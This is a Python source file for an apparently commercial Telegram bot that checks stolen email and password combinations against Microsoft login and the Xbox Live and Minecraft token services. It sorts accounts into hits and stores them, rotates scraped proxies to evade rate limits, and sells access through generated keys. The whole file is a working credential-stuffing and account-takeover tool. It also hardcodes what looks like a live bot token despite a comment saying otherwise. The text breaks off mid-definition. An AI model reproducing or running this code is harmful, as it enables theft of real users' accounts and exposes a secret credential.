# cosmo_xbox_bot.py
import asyncio
import subprocess
import sys
import os
import re
import time
import json
import secrets
import random
import socket
import logging
import tempfile
import socks
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, List
from dataclasses import dataclass
from enum import Enum
from collections import deque
import threading
import concurrent.futures
from logging.handlers import RotatingFileHandler
import aiohttp
import aiofiles

try:
    import requests
    import urllib3
    import warnings
    from aiogram import Bot, Dispatcher, types
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, FSInputFile
    from aiogram.filters import Command, CommandObject
    from aiogram import F
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    from colorama import Fore, Style, init
    MODULES_INSTALLED = True
except ImportError:
    MODULES_INSTALLED = False

if not MODULES_INSTALLED:
    print("Installing required modules...")
    modules = ["requests", "aiogram", "urllib3", "colorama", "aiohttp", "aiofiles", "pysocks"]
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("✓ Modules installed! Please restart the script.")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {e}\nInstall manually: pip install {' '.join(modules)}")
        sys.exit(1)

import urllib3
import warnings

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
logger = logging.getLogger("cosmo_xbox_bot")
logger.setLevel(logging.INFO)
if not logger.handlers:
    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    file_handler = RotatingFileHandler(
        os.path.join(LOG_DIR, "bot.log"),
        maxBytes=1_000_000,
        backupCount=3,
        encoding="utf-8",
    )
    console_handler = logging.StreamHandler(sys.stdout)
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

# ══════════════════════════════════════════════
# BOT CONFIGURATION
BOT_NAME = "✨ XBOX CHECKER"
BOT_VERSION = "v2.0"
OWNER_USERNAME = "@maten8011"
OWNER_NAME = "maten8011"
BOT_CHANNEL = "https://t.me/JoinThePiratesCloud"

# Bot token is supplied through the BOT_TOKEN environment secret.
BOT_TOKEN = "8909471198:AAHj3a_RCkY-rCl4P7N8e1ovX9S9b54Vwww"


# ══════════════════════════════════════════════
# ADMIN CONFIGURATION - Multiple Admins
ADMIN_IDS = [
    7578158962,  # Owner/Admin 1
    7861390927,  # l admin chat ID
]

OWNER_ID = 7578158962
TESTER = 7861390927
OWNER_IDS = {OWNER_ID, TESTER}

MY_SIGNATURE = "@maten8011"

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def has_access(user_id: int) -> bool:
    """Owners have unlimited access; regular users need an active key."""
    return is_owner(user_id) or db.has_active_key(user_id)

def should_hide_owner_info(user_id: int) -> bool:
    """Keep the configured owner's identity private for the special chat ID."""
    return user_id == HIDDEN_OWNER_INFO_USER_ID

def owner_label(user_id: int) -> str:
    """Return the owner label shown in user-facing bot messages."""
    return "🔒 Hidden" if should_hide_owner_info(user_id) else OWNER_USERNAME

# ══════════════════════════════════════════════
# CHECKER CONFIGURATION (from ex.py)
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 2
REQUEST_TIMEOUT = 7
THREAD_COUNT = 8
MAX_PENDING_TASKS = 50

# ══════════════════════════════════════════════
# QUEUE SYSTEM
class CheckQueue:
    def __init__(self):
        self.queue = deque()
        self.processing = False
        self.lock = threading.Lock()
        self.current_task = None
        self.queue_status = {}
        
    def add_to_queue(self, user_id: int, task_type: str, data: dict, message_obj=None) -> int:
        with self.lock:
            for i, task in enumerate(self.queue):
                if task['user_id'] == user_id and task['status'] == 'pending':
                    return -1

            if len(self.queue) >= MAX_PENDING_TASKS:
                return -2
            
            priority = 0 if is_admin(user_id) else 1
            
            position = len(self.queue)
            for i, task in enumerate(self.queue):
                if task['priority'] > priority:
                    position = i
                    break
            
            task = {
                'user_id': user_id,
                'task_type': task_type,
                'data': data,
                'message_obj': message_obj,
                'priority': priority,
                'status': 'pending',
                'added_at': datetime.now().isoformat(),
                'position': position
            }
            
            self.queue.insert(position, task)
            
            for i, t in enumerate(self.queue):
                t['position'] = i
            
            return position
    
    def get_queue_position(self, user_id: int) -> Optional[int]:
        with self.lock:
            for i, task in enumerate(self.queue):
                if task['user_id'] == user_id and task['status'] == 'pending':
                    return i + 1
            return None
    
    def get_queue_length(self) -> int:
        with self.lock:
            return len([t for t in self.queue if t['status'] == 'pending'])
    
    def get_queue_status(self) -> dict:
        with self.lock:
            pending = [t for t in self.queue if t['status'] == 'pending']
            return {
                'total': len(pending),
                'admins': len([t for t in pending if t['priority'] == 0]),
                'users': len([t for t in pending if t['priority'] == 1]),
                'pending': pending
            }
    
    def get_next_task(self):
        with self.lock:
            for task in self.queue:
                if task['status'] == 'pending':
                    task['status'] = 'processing'
                    return task
            return None
    
    def complete_task(self, user_id: int):
        with self.lock:
            for i, task in enumerate(self.queue):
                if task['user_id'] == user_id and task['status'] == 'processing':
                    del self.queue[i]
                    for j, t in enumerate(self.queue):
                        t['position'] = j
                    return True
            return False
    
    def clear_user_tasks(self, user_id: int):
        with self.lock:
            self.queue = [t for t in self.queue if t['user_id'] != user_id]
            for i, t in enumerate(self.queue):
                t['position'] = i

check_queue = CheckQueue()

# ══════════════════════════════════════════════
# DATA STORAGE (with Per-User Proxy Support)
class Database:
    def __init__(self):
        self.users_file = "data/users.json"
        self.keys_file = "data/keys.json"
        self.results_file = "data/results.json"
        self.settings_file = "data/settings.json"
        self.io_lock = threading.RLock()
        
        os.makedirs("data", exist_ok=True)
        os.makedirs("Results/Minecraft", exist_ok=True)
        os.makedirs("Results/GamePass", exist_ok=True)
        os.makedirs("Results/Xbox", exist_ok=True)
        os.makedirs("Results/NotLinked", exist_ok=True)
        os.makedirs("Results/2FA", exist_ok=True)
        self._load_data()

    def _load_data(self):
        self.users = self._load_json(self.users_file) or {}
        self.keys = self._load_json(self.keys_file) or {}
        self.results = self._load_json(self.results_file) or {"hits": [], "total_checked": 0}
        self.settings = self._load_json(self.settings_file) or {"total_keys_issued": 0}

    def _load_json(self, filepath):
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return None

    def _save_json(self, filepath, data):
        directory = os.path.dirname(filepath) or "."
        temp_path = None
        try:
            fd, temp_path = tempfile.mkstemp(
                prefix=".write_",
                suffix=".tmp",
                dir=directory,
            )
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
                f.flush()
                os.fsync(f.fileno())
            os.replace(temp_path, filepath)
        except Exception:
            if temp_path and os.path.exists(temp_path):
                os.remove(temp_path)
            raise

    def save_all(self):
        with self.io_lock:
            try:
                self._save_json(self.users_file, self.users)
                self._save_json(self.keys_file, self.keys)
                self._save_json(self.results_file, self.results)
                self._save_json(self.settings_file, self.settings)
            except Exception:
                logger.exception("Database save failed")
                raise

    def get_user(self, user_id: int) -> dict:
        user_id = str(user_id)
        if user_id not in self.users:
            self.users[user_id] = {
                "keys": [],
                "total_checks": 0,
                "hits": 0,
                "joined": datetime.now().isoformat(),
                "username": None,
                "first_name": None,
                "last_check": None,
                "is_active": True,
                # ⭐ PER-USER PROXY SETTINGS
                "proxy_type": "none",  # http, socks4, socks5, none
                "proxies": []         # User-specific proxy list
            }
            self.save_all()
        return self.users[user_id]

    def update_user(self, user_id: int, data: dict):
        user_id = str(user_id)
        if user_id not in self.users:
            self.users[user_id] = {"keys": [], "proxies": [], "proxy_type": "none"}
        self.users[user_id].update(data)
        self.save_all()

    def has_active_key(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user.get("keys"):
            return False
        
        now = datetime.now()
        for key_entry in user.get("keys", []):
            try:
                expiry = datetime.fromisoformat(key_entry["expires_at"])
                if expiry > now:
                    return True
            except:
                continue
        return False

    def get_active_key_duration(self, user_id: int) -> int:
        user = self.get_user(user_id)
        if not user.get("keys"):
            return 0
        
        now = datetime.now()
        max_hours = 0
        for key_entry in user.get("keys", []):
            try:
                expiry = datetime.fromisoformat(key_entry["expires_at"])
                if expiry > now:
                    hours = (expiry - now).total_seconds() / 3600
                    max_hours = max(max_hours, hours)
            except:
                continue
        return int(max_hours)

    def get_user_key_status(self, user_id: int) -> dict:
        user = self.get_user(user_id)
        if not user.get("keys"):
            return {"has_key": False, "expires_at": None, "hours_left": 0}
        
        now = datetime.now()
        valid_keys = []
        for key_entry in user.get("keys", []):
            try:
                expiry = datetime.fromisoformat(key_entry["expires_at"])
                if expiry > now:
                    valid_keys.append({
                        "expires_at": expiry.isoformat(),
                        "hours_left": (expiry - now).total_seconds() / 3600
                    })
            except:
                continue
        
        if valid_keys:
            best = max(valid_keys, key=lambda x: x["hours_left"])
            return {
                "has_key": True,
                "expires_at": best["expires_at"],
                "hours_left": int(best["hours_left"])
            }
        
        return {"has_key": False, "expires_at": None, "hours_left": 0}

    def use_key_check(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        user["total_checks"] = user.get("total_checks", 0) + 1
        user["last_check"] = datetime.now().isoformat()
        self.results["total_checked"] = self.results.get("total_checked", 0) + 1
        self.save_all()
        return True

    def create_key(self, duration_hours: int, max_uses: int = None, created_by: int = None) -> str:
        key = f"Cosmo{secrets.token_hex(8).upper()}"
        expires_at = datetime.now() + timedelta(hours=duration_hours)
        
        self.keys[key] = {
            "duration_hours": duration_hours,
            "max_uses": max_uses,
            "used_count": 0,
            "created": datetime.now().isoformat(),
            "created_by": str(created_by) if created_by else "admin",
            "users": [],
            "expires_at": expires_at.isoformat(),
            "is_active": True
        }
        self.settings["total_keys_issued"] = self.settings.get("total_keys_issued", 0) + 1
        self.save_all()
        return key

    def redeem_key(self, key: str, user_id: int) -> Optional[int]:
        if key not in self.keys:
            return None
        
        key_data = self.keys[key]
        
        if key_data.get("expires_at"):
            key_expiry = datetime.fromisoformat(key_data["expires_at"])
            if key_expiry < datetime.now():
                key_data["is_active"] = False
                self.save_all()
                return -3
        
        if not key_data.get("is_active", True):
            return -4
        
        if key_data.get("max_uses") is not None:
            if key_data["used_count"] >= key_data["max_uses"]:
                return -1
        
        if str(user_id) in key_data["users"]:
            return -2
        
        key_data["used_count"] += 1
        key_data["users"].append(str(user_id))
        
        user = self.get_user(user_id)
        expires_at = datetime.now() + timedelta(hours=key_data["duration_hours"])
        user["keys"].append({
            "key": key,
            "activated_at": datetime.now().isoformat(),
            "expires_at": expires_at.isoformat(),
            "duration_hours": key_data["duration_hours"]
        })
        user["is_active"] = True
        
        self.save_all()
        return key_data["duration_hours"]

    def extend_key(self, user_id: int, duration_hours: int) -> bool:
        user = self.get_user(user_id)
        if not user.get("keys"):
            return False
        
        now = datetime.now()
        for key_entry in user["keys"]:
            expiry = datetime.fromisoformat(key_entry["expires_at"])
            if expiry > now:
                new_expiry = expiry + timedelta(hours=duration_hours)
                key_entry["expires_at"] = new_expiry.isoformat()
            else:
                new_expiry = now + timedelta(hours=duration_hours)
                key_entry["expires_at"] = new_expiry.isoformat()
        
        user["is_active"] = True
        self.save_all()
        return True

    def add_hit(self, hit_data: dict):
        self.results["hits"].append(hit_data)
        self.save_all()

    def get_stats(self) -> dict:
        total_users = len(self.users)
        active_users = len([u for u in self.users.values() if self.has_active_key(int(u.get("user_id", 0)))])
        total_checks = sum(u.get("total_checks", 0) for u in self.users.values())
        total_hits = sum(u.get("hits", 0) for u in self.users.values())
        total_keys = len(self.keys)
        total_issued = self.settings.get("total_keys_issued", 0)
        
        top_users = sorted(
            [(uid, data.get("hits", 0), data.get("username", "Unknown")) 
             for uid, data in self.users.items()],
            key=lambda x: x[1],
            reverse=True
        )[:5]
        
        return {
            "total_users": total_users,
            "active_users": active_users,
            "total_checks": total_checks,
            "total_hits": total_hits,
            "total_keys": total_keys,
            "total_issued": total_issued,
            "top_users": top_users
        }

db = Database()

# ══════════════════════════════════════════════
# ⭐ PER-USER PROXY FUNCTIONS
# ══════════════════════════════════════════════

def get_user_proxy(user_id: int) -> Optional[dict]:
    """Get proxy for specific user"""
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    proxylist = user.get("proxies", [])
    
    if proxy_type == "none" or len(proxylist) == 0:
        return None
    
    try:
        proxy = random.choice(proxylist)
        
        if proxy_type == "http":
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        elif proxy_type == "socks4":
            return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
        elif proxy_type == "socks5":
            return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
        else:
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
    except:
        return None

def set_user_proxy_type(user_id: int, proxy_type: str):
    """Set proxy type for user"""
    user = db.get_user(user_id)
    user["proxy_type"] = proxy_type
    db.save_all()

def load_user_proxies(user_id: int, file_path: str) -> tuple:
    """Load proxies for specific user"""
    user = db.get_user(user_id)
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as e:
            proxies = []
            for line in e:
                proxy = line.strip().replace('\n', '')
                if proxy:
                    proxies.append(proxy)
            user["proxies"] = proxies
            db.save_all()
        return True, f"Loaded [{len(proxies)}] proxies for your account."
    except Exception as e:
        return False, f"Failed to load proxies: {e}"

def scrape_user_proxies(user_id: int) -> int:
    """Scrape proxies for specific user"""
    user = db.get_user(user_id)
    http_proxies = []
    socks4_proxies = []
    socks5_proxies = []
    
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    
    for service in api_http:
        try:
            resp = requests.get(service, timeout=30)
            http_proxies.extend(resp.text.splitlines())
        except:
            pass
    
    for service in api_socks4:
        try:
            resp = requests.get(service, timeout=30)
            socks4_proxies.extend(resp.text.splitlines())
        except:
            pass
    
    for service in api_socks5:
        try:
            resp = requests.get(service, timeout=30)
            socks5_proxies.extend(resp.text.splitlines())
        except:
            pass
    
    # Clean and deduplicate
    all_proxies = list(set(
        [p.strip() for p in http_proxies if p.strip()] +
        [p.strip() for p in socks4_proxies if p.strip()] +
        [p.strip() for p in socks5_proxies if p.strip()]
    ))
    
    user["proxies"] = all_proxies
    db.save_all()
    
    return len(all_proxies)

# ══════════════════════════════════════════════
# CHECKER FUNCTIONS (with user-specific proxy support)

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(
                url_post, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True, timeout=REQUEST_TIMEOUT
            )
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    return xbox_token, uhs
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                return response.json().get('Token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', ["Xbox Game Pass"]
                elif '"product_minecraft"' in text:
                    return 'Minecraft', ["Minecraft Java"]
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text:
                        others.append("Bedrock")
                    if 'product_legends' in text:
                        others.append("Legends")
                    if 'product_dungeons' in text:
                        others.append("Dungeons")
                    if others:
                        return 'Xbox: ' + ', '.join(others), others
                    return None, []
            elif response.status_code == 429:
                time.sleep(2)
                continue
            else:
                return None, []
        except:
            if attempt == max_attempts - 1:
                return None, []
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 404:
                return None
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier": settings.get("AccountTier", "N/A"),
                    "rep": settings.get("XboxOneRep", "N/A"),
                }
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            pass
        time.sleep(0.3)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ══════════════════════════════════════════════
# ⭐ MAIN CHECK FUNCTION (with user-specific proxy)
def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
    result = {
        "success": False,
        "type": "bad",
        "email": email,
        "password": password,
        "name": "N/A",
        "uuid": "N/A",
        "capes": "None",
        "gamertag": "N/A",
        "subscriptions": "None",
        "tier": "N/A",
        "rep": "N/A",
        "error": None
    }

    try:
        session = requests.Session()
        session.verify = False
        
        # ⭐ Use user-specific proxy if user_id provided
        if user_id:
            session.proxies = get_user_proxy(user_id)
        else:
            session.proxies = None

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            result["error"] = "Failed to get SFTag"
            return result

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            result["type"] = "2fa"
            result["error"] = "2FA Required"
            return result
        elif auth_status == "bad":
            result["type"] = "bad"
            result["error"] = "Invalid credentials"
            return result
        elif auth_status != "success" or not ms_token:
            result["type"] = "error"
            result["error"] = "Authentication failed"
            return result

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            result["type"] = "bad"
            result["error"] = "Xbox token failed"
            return result

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            result["type"] = "bad"
            result["error"] = "XSTS token failed"
            return result

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        result["gamertag"] = xbox_profile.get("gamertag", "N/A")
        result["tier"] = xbox_profile.get("tier", "N/A")
        result["rep"] = xbox_profile.get("rep", "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            result["type"] = "bad"
            result["error"] = "Minecraft token failed"
            return result

        account_type, subs = check_entitlements(session, mc_token)

        if not account_type:
            result["success"] = True
            result["type"] = "not_linked"
            result["subscriptions"] = "None"
            result["name"] = "N/A"
            return result

        profile = get_profile(session, mc_token)
        result["name"] = profile.get('name', 'Not Set') if profile else "Not Set"
        result["uuid"] = profile.get('id', 'N/A') if profile else "N/A"
        result["capes"] = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
        if not result["capes"]:
            result["capes"] = "None"

        result["subscriptions"] = ", ".join(subs) if subs else "None"
        result["type"] = account_type
        result["success"] = True

        return result

    except Exception as e:
        result["type"] = "error"
        result["error"] = str(e)
        return result
    finally:
        try:
            session.close()
        except:
            pass

# ══════════════════════════════════════════════
# TELEGRAM BOT
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ══════════════════════════════════════════════
# EMOJI MAPS
EMOJIS = {
    "success": "✅",
    "error": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "loading": "⏳",
    "processing": "🔄",
    "done": "🎯",
    "waiting": "⏰",
    "clock": "⏰",
    "ultimate": "👑",
    "gamepass": "🎮",
    "minecraft": "⛏️",
    "xbox": "🕹️",
    "notlinked": "🔓",
    "bad": "❌",
    "twofa": "🔐",
    "hit": "💎",
    "check": "🔍",
    "file": "📁",
    "stats": "📊",
    "about": "ℹ️",
    "owner": "👑",
    "queue": "📋",
    "back": "🔙",
    "menu": "📋",
    "settings": "⚙️",
    "admin": "🛡️",
    "proxy": "🌐",
    "http": "🌍",
    "socks4": "🔷",
    "socks5": "🔶",
    "none": "🚫",
    "scrape": "🔄",
    "load": "📂",
    "status": "📊",
    "key": "🔑",
    "access": "🔓",
    "locked": "🔒",
    "protected": "🛡️",
    "user": "👤",
    "users": "👥",
    "admin_user": "👑",
    "calendar": "📅",
    "star": "⭐",
    "gift": "🎁",
    "fire": "🔥",
    "rocket": "🚀",
    "target": "🎯",
    "trophy": "🏆",
    "medal": "🥇",
    "gem": "💎",
    "thunder": "⚡",
    "pencil": "✏️",
    "link": "🔗",
    "channel": "📢",
    "server": "🖥️",
    "database": "💾",
    "network": "🌐",
    "speed": "🚄",
    "power": "💪",
}

# ══════════════════════════════════════════════
# KEYBOARDS

def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    # User ka current proxy status dikhane ke liye
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    proxy_count = len(user.get("proxies", []))
    
    # Proxy indicator
    if proxy_type != "none" and proxy_count > 0:
        proxy_indicator = f"🌐 {proxy_type.upper()} ({proxy_count})"
    else:
        proxy_indicator = "🚫 No Proxy"
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text=f"{EMOJIS['check']} Check Account"),
                KeyboardButton(text=f"{EMOJIS['file']} Check File")
            ],
            [
                KeyboardButton(text=f"{EMOJIS['stats']} My Stats"),
                KeyboardButton(text=f"{EMOJIS['about']} About Bot")
            ],
            [
                KeyboardButton(text=f"{EMOJIS['owner']} Owner"),
                KeyboardButton(text=f"{EMOJIS['queue']} Queue Status")
            ],
            [
                KeyboardButton(text=f"{EMOJIS['proxy']} Proxy Settings"),
                KeyboardButton(text=f"{EMOJIS['scrape']} Scrape Proxies")
            ],
            [
                KeyboardButton(text=f"📊 {proxy_indicator}")
            ]
        ],
        resize_keyboard=True,
        input_field_placeholder="Choose an option..."
    )
    
    if is_admin(user_id):
        keyboard.keyboard.append([
            KeyboardButton(text=f"{EMOJIS['admin']} Admin Panel")
        ])
    
    return keyboard

def get_inline_menu() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.button(text=f"{EMOJIS['check']} Check", callback_data="menu_check")
    builder.button(text=f"{EMOJIS['file']} File", callback_data="menu_file")
    builder.button(text=f"{EMOJIS['stats']} Stats", callback_data="menu_stats")
    builder.button(text=f"{EMOJIS['about']} Help", callback_data="menu_help")
    builder.button(text=f"{EMOJIS['owner']} Owner", callback_data="menu_owner")
    builder.button(text=f"{EMOJIS['queue']} Queue", callback_data="menu_queue")
    builder.adjust(2)
    return builder.as_markup()

def get_admin_inline_menu() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.button(text=f"{EMOJIS['gift']} Generate Key", callback_data="admin_gen_key")
    builder.button(text=f"{EMOJIS['stats']} Bot Stats", callback_data="admin_stats")
    builder.button(text=f"{EMOJIS['users']} Users List", callback_data="admin_users")
    builder.button(text=f"{EMOJIS['trophy']} Top Users", callback_data="admin_top")
    builder.button(text=f"{EMOJIS['clock']} Extend Access", callback_data="admin_extend")
    builder.button(text=f"{EMOJIS['key']} View Keys", callback_data="admin_keys")
    builder.button(text=f"{EMOJIS['queue']} Queue Status", callback_data="admin_queue")
    builder.button(text=f"{EMOJIS['back']} Back", callback_data="menu_back")
    builder.adjust(2)
    return builder.as_markup()

# ══════════════════════════════════════════════
# ⭐ PER-USER PROXY SETTINGS KEYBOARD

def get_user_proxy_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    user = db.get_user(user_id)
    current_type = user.get("proxy_type", "none")
    
    # Highlight current selection
    http_mark = " ✅" if current_type == "http" else ""
    socks4_mark = " ✅" if current_type == "socks4" else ""
    socks5_mark = " ✅" if current_type == "socks5" else ""
    none_mark = " ✅" if current_type == "none" else ""
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text=f"{EMOJIS['http']} HTTP{http_mark}"),
                KeyboardButton(text=f"{EMOJIS['socks4']} SOCKS4{socks4_mark}"),
                KeyboardButton(text=f"{EMOJIS['socks5']} SOCKS5{socks5_mark}")
            ],
            [
                KeyboardButton(text=f"{EMOJIS['none']} None{none_mark}"),
                KeyboardButton(text=f"{EMOJIS['load']} Load Proxies"),
                KeyboardButton(text=f"{EMOJIS['scrape']} Scrape Proxies")
            ],
            [
                KeyboardButton(text=f"{EMOJIS['status']} My Proxy Status"),
                KeyboardButton(text=f"{EMOJIS['back']} Back to Menu")
            ]
        ],
        resize_keyboard=True
